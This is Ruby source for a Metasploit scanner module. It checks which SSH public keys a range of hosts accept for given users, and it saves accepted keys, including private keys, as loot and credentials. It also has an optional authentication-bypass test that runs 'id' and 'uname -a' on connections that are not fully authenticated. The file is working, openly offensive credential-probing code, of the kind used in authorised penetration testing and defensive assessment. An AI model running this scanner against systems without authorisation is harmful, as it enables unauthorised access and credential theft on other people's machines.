# encoding: binary

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/ssh'
require 'sshkey'
require 'net/ssh/pubkey_verifier'
require 'tempfile'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::SSH
  include Msf::Exploit::Deprecated
  moved_from 'auxiliary/scanner/ssh/ssh_identify_pubkeys'

  def initialize
    super(
      'Name' => 'SSH Public Key Acceptance Scanner',
      'Description' => %q{
        This module can determine what public keys are configured for
        key-based authentication across a range of machines, users, and
        sets of known keys. The SSH protocol indicates whether a particular
        key is accepted prior to the client performing the actual signed
        authentication request. To use this module, a text file containing
        one or more SSH keys should be provided. These can be private or
        public, so long as no passphrase is set on the private keys.

        If you have loaded a database plugin and connected to a database
        this module will record authorized public keys and hosts so you can
        track your process.

        Key files may be a single public (unencrypted) key, or several public
        keys concatenated together as an ASCII text file. Non-key data should be
        silently ignored. Private keys will only utilize the public key component
        stored within the key file.
      },
      'Author' => [
        'todb',
        'hdm',
        'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>', # Reworked the storage (db, credentials, notes, loot) only
      ],
      'License' => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(22),
        OptPath.new('KEY_FILE', [false, 'File containing one or more SSH public or unencrypted private keys']),
        OptPath.new('KEY_DIR', [false, 'Directory of SSH public or unencrypted private key files (dot-prefixed filenames are ignored)'])
      ]
    )

    register_advanced_options(
      [
        OptBool.new('CHECK_SUPPORTED_KEYS', [true, 'Probe the server KEX to skip key types it does not support', true]),
        OptString.new('SSH_KEYFILE_B64', [false, 'Base64-encoded SSH public or unencrypted private key data (intended for programmatic use only)', '']),
        OptBool.new('SSH_BYPASS', [ false, 'When a key is accepted, test whether the server allows command execution without completing authentication', false]),
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [ false, 'Maximum time in seconds to negotiate an SSH session', 30])
      ]
    )

    deregister_options(
      'PASSWORD', 'PASS_FILE', 'BLANK_PASSWORDS', 'USER_AS_PASS', 'USERPASS_FILE', 'DB_ALL_PASS', 'DB_ALL_CREDS'
    )

    @strip_passwords = true
  end

  def key_dir
    datastore['KEY_DIR']
  end

  def key_file
    datastore['KEY_FILE']
  end

  def rport
    datastore['RPORT']
  end

  def ip
    datastore['RHOST']
  end

  def probe_server_capabilities(ip, port)
    return @server_supported_key_types if @server_supported_key_types

    factory = ssh_socket_factory
    opt_hash = {
      port: port,
      use_agent: false,
      config: false,
      proxy: factory,
      non_interactive: true,
      verify_host_key: :never,
      timeout: datastore['SSH_TIMEOUT']
    }

    transport = nil
    begin
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        transport = Net::SSH::Transport::Session.new(ip, opt_hash)
      end
      vprint_status("#{ip}:#{rport} - Banner: #{transport.server_version.version.to_s.strip}")

      server_data = transport.algorithms.instance_variable_get(:@server_data)
      @server_supported_key_types = server_data[:host_key]
      vprint_status("#{ip}:#{rport} - Supported key types: #{@server_supported_key_types.join(', ')}")
    rescue Rex::ConnectionError
      @server_supported_key_types = nil
    rescue StandardError => e
      vprint_status("#{ip}:#{rport} - Could not determine supported key types (#{e.message}), trying all")
      @server_supported_key_types = nil
    ensure
      begin
        transport&.close
      rescue StandardError
        nil
      end
    end

    @server_supported_key_types
  end

  def key_type_from_public(public_key)
    public_key.to_s.split.first
  end

  def extract_raw_keys(content)
    keys = []
    this_key = []
    in_key = false
    content.split("\n").each do |line|
      if /(?<key>(?:ssh-|ecdsa-)\S+\s+\S+.*)/ =~ line
        keys << key
        next
      end
      in_key = true if line =~ /^-----BEGIN (?:[RD]SA|EC|OPENSSH) (?:PRIVATE|PUBLIC) KEY-----/
      this_key << line if in_key
      next unless line =~ /^-----END (?:[RD]SA|EC|OPENSSH) (?:PRIVATE|PUBLIC) KEY-----/

      in_key = false
      keys << (this_key.join("\n") + "\n")
      this_key = []
    end
    keys
  end

  def read_keyfile(file)
    if file == :keyfile_b64
      content = datastore['SSH_KEYFILE_B64'].unpack('m*').first
      keys = validate_keys(extract_raw_keys(content))
    elsif file.is_a? Array
      keys = []
      file.each do |dir_entry|
        next unless ::File.readable? dir_entry

        content = ::File.open(dir_entry, 'rb') { |f| f.read(f.stat.size) }
        found = validate_keys(extract_raw_keys(content), source: File.basename(dir_entry))
        if found.empty?
          print_status("Skipping: #{File.basename(dir_entry)} (no valid keys found)")
        else
          keys.concat(found)
        end
      end

      seen = {}
      keys.each do |k|
        key_id = k[:public].to_s.split[0..1].join(' ')
        existing = seen[key_id]
        seen[key_id] = k if existing.nil? || (existing[:private].to_s.empty? && !k[:private].to_s.empty?)
      end
      keys.replace(seen.values)
    else
      content = ::File.open(file, 'rb') { |f| f.read(f.stat.size) }
      keys = validate_keys(extract_raw_keys(content), source: File.basename(file))
    end
    if keys.empty?
      print_error "#{ip}:#{rport} SSH - No valid keys found"
    end
    keys
  end

  # Validates that the key isn't total garbage, and converts PEM formatted
  # keys to SSH formatted keys.
  def validate_keys(keys, source: nil)
    keepers = []
    keys.each do |key|
      if key =~ /(?:ssh-|ecdsa-)\S+/
        keepers << { public: key, private: '', source: source }
      elsif key =~ /-----BEGIN (?:OPENSSH|EC) PRIVATE KEY-----/
        ssh_key = Tempfile.open('msf_ssh_key') do |f|
          f.write(key)
          f.flush

          begin
            Net::SSH::KeyFactory.load_private_key(f.path)
          rescue StandardError
            nil
          end
        end

        if ssh_key
          public_key = "#{ssh_key.ssh_type} #{[ssh_key.to_blob].pack('m0')}"
          keepers << { public: public_key, private: key, source: source, converted: true }
        end
      else
        # Use the mighty SSHKey library from James Miller to convert them on the fly.
        # This is where a PRIVATE key has been provided
        ssh_version = begin
          SSHKey.new(key).ssh_public_key
        rescue StandardError
          nil
        end

        if ssh_version
          print_status("No conversion needed: #{source}")
          keepers << { public: ssh_version, private: key, source: source }
        end
      end
    end
    if keepers.empty?
      print_error "#{ip}:#{rport} SSH - No valid keys found"
    end
    keepers.uniq
  end

  def pull_cleartext_keys(keys)
    cleartext_keys = []
    keys.each do |key|
      next unless key[:public]
      next if key[:private] =~ /Proc-Type:.*ENCRYPTED/

      cleartext_keys << { public: key[:public].gsub(/\x0d/, ''), private: key[:private], source: key[:source], converted: key[:converted] }
    end
    if cleartext_keys.empty?
      print_error "#{ip}:#{rport} SSH - No valid cleartext keys found"
    end
    cleartext_keys
  end

  def load_cleartext_keys
    keys = if key_file && File.readable?(key_file)
             pull_cleartext_keys(read_keyfile(key_file))
           elsif datastore['SSH_KEYFILE_B64'] && !datastore['SSH_KEYFILE_B64'].empty?
             pull_cleartext_keys(read_keyfile(:keyfile_b64))
           elsif datastore['KEY_DIR']
             unless File.directory?(key_dir) && File.readable?(key_dir)
               print_error("Cannot read KEY_DIR: #{key_dir}")
               return []
             end

             key_files = Dir.entries(key_dir).reject { |f| f.start_with?('.') || File.directory?(File.join(key_dir, f)) }
             print_status("#{key_dir}: #{key_files.size} file#{key_files.size == 1 ? '' : 's'} (#{key_files.join(', ')})")
             pull_cleartext_keys(read_keyfile(key_files.map { |f| File.join(key_dir, f) }))
           else
             []
           end
    converted = keys.select { |k| k[:converted] }.map { |k| k[:source] }.compact.uniq
    print_status("Converting modern OpenSSH key to public key blob: #{converted.join(', ')}") unless converted.empty?
    keys
  end

  def do_login(ip, port, user)
    cleartext_keys = load_cleartext_keys
    return :missing_keyfile if cleartext_keys.empty?

    unless @alerted_with_msg
      print_status "#{ip}:#{rport} SSH - Trying #{cleartext_keys.size} cleartext key#{cleartext_keys.size > 1 ? 's' : ''} per user."
      @alerted_with_msg = true
    end

    unless @testable_keys
      if datastore['CHECK_SUPPORTED_KEYS']
        supported_key_types = probe_server_capabilities(ip, port)
        return :connection_error unless supported_key_types

        testable = cleartext_keys.select do |key_data|
          key_type = key_type_from_public(key_data[:public])
          key_type.nil? || supported_key_types.include?(key_type)
        end

        (cleartext_keys - testable).group_by { |k| key_type_from_public(k[:public]) }.each do |key_type, keys|
          labels = keys.map { |k| k[:source] || k[:public].to_s.split.first }.join(', ')
          print_status("#{ip}:#{rport} - Server does not support #{key_type}, skipping: #{labels}")
        end

        @testable_keys = testable
      else
        @testable_keys = cleartext_keys
      end
    end

    testable_keys = @testable_keys

    testable_keys.each_with_index do |key_data, key_idx|
      key_info = ''
      if key_data[:public] =~ /ssh-(rsa|dss)\s+([^\s]+)\s+(.*)/
        key_info = "- #{::Regexp.last_match(3).strip}"
      end

      factory = ssh_socket_factory

      opt_hash = {
        auth_methods: ['publickey'],
        port: port,
        key_data: key_data[:public],
        use_agent: false,
        config: false,
        proxy: factory,
        non_interactive: true,
        verify_host_key: :never
      }

      opt_hash.merge!(verbose: :debug) if datastore['SSH_DEBUG']

      begin
        ssh_socket = nil
        success = false
        verifier = Net::SSH::PubkeyVerifier.new(ip, user, opt_hash)
        ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
          success = verifier.verify
          ssh_socket = verifier.connection
        end

        if datastore['SSH_BYPASS'] && ssh_socket
          data = nil

          print_status("#{ip}:#{rport} SSH - User #{user} is being tested for authentication bypass...")

          begin
            ::Timeout.timeout(5) { data = ssh_socket.exec!("help\nid\nuname -a").to_s }
          rescue StandardError
            nil
          end

          print_brute(level: :good, msg: "User #{user} successfully bypassed authentication: #{data.inspect} ") if data
        end

        begin
          ::Timeout.timeout(1) { ssh_socket.close if ssh_socket }
        rescue StandardError
          nil
        end
      rescue Rex::ConnectionError
        return :connection_error
      rescue Net::SSH::Disconnect, ::EOFError
        return :connection_disconnect
      rescue Net::SSH::AuthenticationFailed
        nil
      rescue Net::SSH::Exception
        return [:fail, nil] # For whatever reason.
      end

      unless success
        key_label = key_data[:source] || "key #{key_idx + 1}"
        print_brute level: :verror, msg: "User #{user} does not accept #{key_label} #{key_info}"
        return [:fail, nil]
      end

      key = verifier.key
      key_fingerprint = key.fingerprint
      user = verifier.user
      private_key_present = (key_data[:private] != '') ? 'Yes' : 'No'

      print_brute level: :good, msg: "Public key accepted: '#{user}' with key '#{key_fingerprint}' (Private Key: #{private_key_present}) #{key_info}"

      key_hash = {
        data: key_data,
        key: key,
        info: key_info
      }
      do_report(ip, rport, user, key_hash)
    end
  end

  def do_report(ip, port, user, key)
    return unless framework.db.active

    key_fingerprint = key[:key].fingerprint
    store_public_keyfile(ip, user, key_fingerprint, key[:data][:public])
    private_key_present = (key[:data][:private] != '') ? 'Yes' : 'No'

    # Store a note relating to the public key test
    note_information = {
      user: user,
      public_key: key[:data][:public],
      private_key: private_key_present,
      info: key[:info]
    }
    report_note(host: ip, port: port, type: 'ssh.publickey.accepted', data: note_information, update: :unique_data)

    if key[:data][:private] != ''
      # Store these keys in loot
      private_keyfile_path = store_private_keyfile(ip, user, key_fingerprint, key[:data][:private])

      # Use the proper credential method to store credentials that we have
      service_data = {
        address: ip,
        port: port,
        service_name: 'ssh',
        protocol: 'tcp',
        workspace_id: myworkspace_id
      }

      credential_data = {
        module_fullname: fullname,
        origin_type: :service,
        private_data: key[:data][:private],
        private_type: :ssh_key,
        username: user
      }.merge(service_data)

      login_data = {
        core: create_credential(credential_data),
        last_attempted_at: DateTime.now,
        status: Metasploit::Model::Login::Status::SUCCESSFUL,
        proof: private_keyfile_path
      }.merge(service_data)
      create_credential_login(login_data)
    end
  end

  def existing_loot(ltype, key_id)
    framework.db.loots(workspace: myworkspace).where(ltype: ltype).select { |l| l.info == key_id }.first
  end

  def store_public_keyfile(ip, user, key_id, key_data)
    safe_username = user.gsub(/[^A-Za-z0-9]/, '_')
    ktype = case key_data
            when /ssh-rsa/ then 'rsa'
            when /ssh-dss/ then 'dsa'
            when /ssh-ed25519/ then 'ed25519'
            when /ecdsa-sha2-(\S+)/ then ::Regexp.last_match(1)
            end
    return unless ktype

    ltype = "host.unix.ssh.#{user}_#{ktype}_public"
    keyfile = existing_loot(ltype, key_id)
    return keyfile.path if keyfile

    keyfile_path = store_loot(
      ltype,
      'application/octet-stream', # Text, but always want to mime-type attach it
      ip,
      (key_data + "\n"),
      "#{safe_username}_#{ktype}.pub",
      key_id
    )
    return keyfile_path
  end

  def store_private_keyfile(ip, user, key_id, key_data)
    safe_username = user.gsub(/[^A-Za-z0-9]/, '_')
    ktype = begin
      key = Net::SSH::KeyFactory.load_data_private_key(key_data, nil, false)
      key.ssh_type.delete_prefix('ssh-').sub(/\Aecdsa-sha2-\S+/, 'ecdsa')
    rescue StandardError
      nil
    end
    return unless ktype

    ltype = "host.unix.ssh.#{user}_#{ktype}_private"
    keyfile = existing_loot(ltype, key_id)
    return keyfile.path if keyfile

    keyfile_path = store_loot(
      ltype,
      'application/octet-stream', # Text, but always want to mime-type attach it
      ip,
      (key_data + "\n"),
      "#{safe_username}_#{ktype}.private",
      key_id
    )
    return keyfile_path
  end

  def run
    unless key_file || datastore['KEY_DIR'] || !datastore['SSH_KEYFILE_B64'].to_s.empty?
      print_error('Please set KEY_FILE or KEY_DIR (or SSH_KEYFILE_B64)')
      return
    end

    if datastore['USERNAME'].to_s.empty? && datastore['USER_FILE'].to_s.empty? && !datastore['DB_ALL_USERS']
      print_error('Please set USERNAME or USER_FILE')
      return
    end

    super
  end

  def run_host(ip)
    # Since SSH collects keys and tries them all on one authentication session,
    # it doesn't make sense to iteratively go through all the keys
    # individually. So, ignore the pass variable, and try all available keys
    # for all users.
    each_user_pass do |user, _pass|
      ret, = do_login(ip, rport, user)
      case ret
      when :connection_error
        vprint_error "#{ip}:#{rport} SSH - Could not connect"
        :abort
      when :connection_disconnect
        vprint_error "#{ip}:#{rport} SSH - Connection timed out"
        :abort
      when :fail
        vprint_error "#{ip}:#{rport} SSH - Failed: '#{user}'"
      when :missing_keyfile
        vprint_error "#{ip}:#{rport} SSH - Cannot read keyfile"
      when :no_valid_keys
        vprint_error "#{ip}:#{rport} SSH - No readable keys in keyfile"
      end
    end
  end
end
